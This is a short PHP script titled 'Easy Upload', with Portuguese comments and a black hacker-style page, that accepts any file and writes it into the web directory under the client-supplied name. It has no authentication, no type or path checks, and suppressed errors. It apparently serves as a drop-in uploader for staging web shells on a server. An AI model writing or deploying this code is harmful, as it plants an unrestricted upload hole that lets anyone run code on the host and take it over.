<?php 
// Upload de arquivos em PHP puro
//       Easy Upload
//       Jonatas Fil


// Easy Upload
echo '<title>Easy Upload</title>';
echo '<body style="background-color:black;">';
echo '<center><h1 style="color:white;">Easy Upload</h1></center>';
echo '<br>';
echo '<br>';
echo '<center><img src="http://www.johnlupher.com/pluginfile.php/286/mod_label/intro/AsciiGuy.gif"></center>';
echo '<br>';
echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upload" type="submit" id="_upload" value="Upload"></form><center>';
if( $_POST['_upload'] == "Upload" )
{
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) 
{ 
echo '<br>';
echo '<center><b style="color:white;">Arquivo Upado com sucesso !!!</center>';
}
else { 
echo '<br>';
echo '<center><b style="color:white;">Falhou !!!</center></body>'; }}
?>
